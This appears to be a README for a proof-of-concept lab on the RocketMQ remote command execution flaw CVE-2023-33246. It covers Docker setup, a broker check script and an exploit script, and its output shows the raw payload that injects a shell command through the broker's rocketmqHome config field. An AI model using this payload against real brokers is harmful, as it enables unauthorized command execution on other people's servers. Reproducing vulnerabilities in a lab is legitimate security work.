## RocketMQ RCE (CVE-2023-33246)

### Build the lab

```bash
$ docker-compose -f lab/docker-compose.yml up --build -d

[+] Running 2/2
 ✔ Container rmqnamesrv  Started
 ✔ Container rmqbroker   Started 
```

### Lab description

Setup with static IPs:

- Host: 10.255.0.1

- Nameserver: 10.255.0.2

Using `check.py` to check the IP of Broker through Nameserver:

```bash
$ python3 check.py 10.255.0.2 9876

Broker address: 10.255.0.xxx:yyyy
Broker version: V4_9_5
```

Using `exploit.py` to exploit:

```bash
$ python3 exploit.py 10.255.0.xxx yyyy '<command>'

b'\x00\x00\x00\xbc\x00\x00\x00`{"code":25,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":403}filterServerNums=1\nrocketmqHome=-c $@|sh . echo <command>;\n'
b'\x00\x00\x00c\x00\x00\x00_{"code":0,"flag":1,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":403}'
```
